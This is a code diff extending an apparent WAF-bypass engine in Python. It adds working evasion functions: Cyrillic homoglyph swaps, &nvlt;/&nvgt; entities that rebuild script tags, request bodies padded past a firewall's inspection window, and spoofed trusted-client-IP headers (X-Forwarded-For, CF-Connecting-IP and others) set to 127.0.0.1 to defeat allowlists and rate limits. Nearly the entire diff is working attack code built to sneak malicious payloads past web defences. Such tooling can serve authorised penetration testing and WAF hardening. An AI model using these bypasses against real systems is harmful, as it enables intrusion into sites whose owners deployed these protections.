@@ -313,6 +313,46 @@ def null_byte_inject(payload: str) -> str:
     return payload + "%00"
 
 
+# Cyrillic/Latin look-alikes: a WAF matching ASCII signatures misses them, the
+# browser/engine still renders/executes the glyph the same.
+_HOMOGLYPHS = {
+    "a": "а", "c": "с", "e": "е", "i": "і", "j": "ј", "o": "о", "p": "р",
+    "s": "ѕ", "x": "х", "y": "у", "A": "А", "B": "В", "C": "С", "E": "Е",
+    "H": "Н", "K": "К", "M": "М", "O": "О", "P": "Р", "T": "Т", "X": "Х",
+}
+
+
+def homoglyph(payload: str) -> str:
+    """Swap ASCII letters for confusable Unicode look-alikes."""
+    return "".join(_HOMOGLYPHS.get(c, c) for c in payload)
+
+
+def multichar_html_entities(payload: str) -> str:
+    """Rebuild tag delimiters with multi-character HTML entities.
+
+    `&nvlt;`/`&nvgt;` each decode to `<`/`>` plus a combining char in an HTML
+    context, so the WAF never sees a literal `<script`, but the browser's HTML
+    parser reconstructs the tag. (Gareth Heyes / PortSwigger entity research.)
+    """
+    return payload.replace("<", "&nvlt;").replace(">", "&nvgt;")
+
+
+def oversized_body_pad(payload: str, pad_to: int = 8192,
+                       content_type: str = "form") -> str:
+    """Push ``payload`` past a WAF's body-inspection window (nowafpls).
+
+    Commercial WAFs only inspect the first N KB of a request body (8-128 KB by
+    tier). Prepending benign filler longer than that window means the malicious
+    payload is never inspected, while the backend still parses the whole body.
+    Filler is plain ``A`` so it carries no signature of its own.
+    """
+    filler = "A" * max(pad_to, 0)
+    if content_type == "json":
+        import json
+        return json.dumps({"padding": filler, "q": payload})
+    return "padding=" + filler + "&q=" + payload
+
+
 def mixed_encoding_chain(payload: str) -> str:
     """Mix URL + case alternation — multiple encoding layers."""
     mc = "".join(c.upper() if i % 2 else c.lower()
@@ -347,7 +387,12 @@ def header_spoof(headers: dict[str, str]) -> dict[str, str]:
     out["User-Agent"] = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/126.0.0.0 Safari/537.36")
-    out["X-Forwarded-For"] = "127.0.0.1"
+    # Spray the whole trusted-client-IP family: different stacks/CDNs read a
+    # different one for allowlists and rate limits.
+    for h in ("X-Forwarded-For", "X-Real-IP", "X-Client-IP", "True-Client-IP",
+              "CF-Connecting-IP", "X-Originating-IP"):
+        out[h] = "127.0.0.1"
+    out["Forwarded"] = "for=127.0.0.1"
     out["Accept"] = ("text/html,application/xhtml+xml,application/xml;"
                      "q=0.9,*/*;q=0.8")
     return out
@@ -387,8 +432,13 @@ BYPASS_TECHNIQUES: dict[str, list[dict[str, str]]] = {
         {"name": "unicode_fullwidth", "description": "Unicode fullwidth normalization bypass"},
         {"name": "hex_encode", "description": "Hex-encode payload characters"},
         {"name": "html_entities", "description": "HTML entity encoding"},
+        {"name": "multichar_html_entities", "description": "Multi-char entities (&nvlt;/&nvgt;) rebuild tags"},
+        {"name": "homoglyph", "description": "Cyrillic/Latin look-alike substitution"},
         {"name": "mixed_encoding_chain", "description": "Mix URL + case encodings"},
         {"name": "encoding_chain", "description": "Double URL-encode the full payload"},
+    ],
+    "resource_limit": [
+        {"name": "oversized_body", "description": "Pad body past the WAF inspection window (nowafpls)"},
     ],
     "request_structure": [
         {"name": "parameter_pollution", "description": "HPP — duplicate parameters"},
@@ -414,6 +464,8 @@ EXTRA_STRATEGIES: dict[str, Callable[[str], str]] = {
     "hex_encode": hex_encode,
     "null_byte_inject": null_byte_inject,
     "mixed_encoding_chain": mixed_encoding_chain,
+    "homoglyph": homoglyph,
+    "multichar_html_entities": multichar_html_entities,
 }
 
 
@@ -514,12 +566,22 @@ class WAFBypassEngine:
             bypasses.append({"X-Forwarded-For": ip})
             bypasses.append({"X-Real-IP": ip})
             bypasses.append({"X-Client-IP": ip})
+            bypasses.append({"True-Client-IP": ip})
+            bypasses.append({"CF-Connecting-IP": ip})
+            bypasses.append({"X-Originating-IP": ip})
+            bypasses.append({"Forwarded": "for={}".format(ip)})
         bypasses.append({"X-HTTP-Method-Override": "PUT"})
         bypasses.append({"X-HTTP-Method-Override": "PATCH"})
         bypasses.append({"Content-Type": "text/plain"})
         bypasses.append({"Content-Type": "application/xml"})
         bypasses.append({"Transfer-Encoding": "chunked"})
         return bypasses
+
+    def generate_oversized_body(self, payload: str, pad_to: int = 8192,
+                                content_type: str = "form") -> str:
+        """Body-size inspection-window bypass (nowafpls): payload past the
+        WAF's inspection limit. Pair with a matching Content-Length."""
+        return oversized_body_pad(payload, pad_to, content_type)
 
     def exhausted(self) -> bool:
         """True when every strategy has been tried once and blocked."""
